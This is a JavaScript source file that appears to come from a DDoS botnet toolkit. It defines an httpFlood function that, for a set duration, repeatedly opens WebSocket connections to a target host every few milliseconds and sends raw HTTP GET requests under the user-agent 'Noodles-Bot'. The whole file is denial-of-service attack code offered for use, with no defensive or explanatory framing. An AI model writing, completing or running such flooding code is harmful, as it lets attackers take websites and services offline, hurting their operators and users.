// main/ddos/http_flood.js
async function httpFlood(target, duration) {
  const url = new URL(target);
  const host = url.hostname;
  const path = url.pathname || '/';
  const port = url.port || (url.protocol === 'https:' ? 443 : 80);
  const protocol = url.protocol === 'https:' ? 'https' : 'http';
  const startTime = Date.now();

  while (Date.now() - startTime < duration * 1000) {
    try {
      const socket = new WebSocket(`${protocol === 'https' ? 'wss' : 'ws'}://${host}:${port}`);

      socket.onopen = () => {
        const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: Noodles-Bot\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n`;
        socket.send(payload);
        console.log(`HTTP Flood: Sent request to ${target}`);
      };

      socket.onmessage = (event) => {
        console.log(`Received: ${event.data}`);
      };

      socket.onerror = (error) => {
        console.error(`WebSocket Error: ${error}`);
        socket.close();
      };

      socket.onclose = (event) => {
        console.log(`WebSocket Closed: ${event.code} ${event.reason}`);
      };

      // Limit the number of connections to avoid overwhelming the client
      await new Promise(resolve => setTimeout(resolve, 5));
    } catch (error) {
      console.error(`Error sending request: ${error}`);
    }
  }

  console.log(`HTTP Flood completed for ${target}`);
}

module.exports = { httpFlood };